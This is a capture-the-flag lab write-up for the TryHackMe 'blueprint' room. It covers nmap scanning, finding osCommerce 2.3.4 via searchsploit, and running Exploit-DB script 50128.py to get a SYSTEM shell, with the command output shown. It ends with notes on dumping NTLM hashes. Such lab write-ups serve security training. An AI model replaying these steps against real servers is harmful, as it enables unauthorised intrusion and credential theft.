# Windows 7 Target – osCommerce 2.3.4 RCE Exploitation

**Date:** 2025-07-28  
**Difficulty:** Medium  
**Target IP:** `10.10.45.93`  
**Objective:** Identify and exploit vulnerabilities to achieve RCE.
Link : https://tryhackme.com/room/blueprint

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -Pn 10.10.45.93
Scan Output:

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152-49160/tcp open  msrpc  Microsoft Windows RPC
Observation:

Port 8080 hosts an Apache web server serving osCommerce 2.3.4 files.

SMB service running on a Windows 7 machine.

Multiple potentially exploitable services.

2. Initial Enumeration
Accessing the service on port 8080:

http://10.10.45.93:8080
The directory listing shows oscommerce-2.3.4 and its /catalog/ directory.

3. Vulnerability Research
Searching for osCommerce 2.3.4 exploits:


searchsploit oscommerce 2.3.4
Results:

osCommerce 2.3.4.1 - Remote Code Execution (2) | php/webapps/50128.py
osCommerce 2.3.4.1 - Remote Code Execution     | php/webapps/44374.py
... and others
Exploit Reference:

Exploit-DB #44374

Exploit-DB #50128

4. Exploitation
Navigate to the exploit location on Kali:

bash
Copy
Edit
cd /usr/share/exploitdb/exploits/php/webapps
python3 50128.py http://10.10.45.93:8080/oscommerce-2.3.4/catalog/
Exploit Output:

pgsql
Copy
Edit
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
Shell Interaction:

shell
Copy
Edit
RCE_SHELL$ dir
07/28/2025  08:37 AM    <DIR>          .
07/28/2025  08:37 AM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
07/28/2025  08:40 AM             1,118 configure.php

RCE_SHELL$ whoami
nt authority\system
5. Post-Exploitation Notes
Privilege Level: SYSTEM (highest on Windows)

Next Steps:

Dump NTLM hashes for lateral movement or cracking.

Refer to NTLM section in RedTeam Notes for hash dumping techniques.

Useful Resource: SS64.com for OS-specific command references (Windows CMD, Linux, PowerShell, etc.).
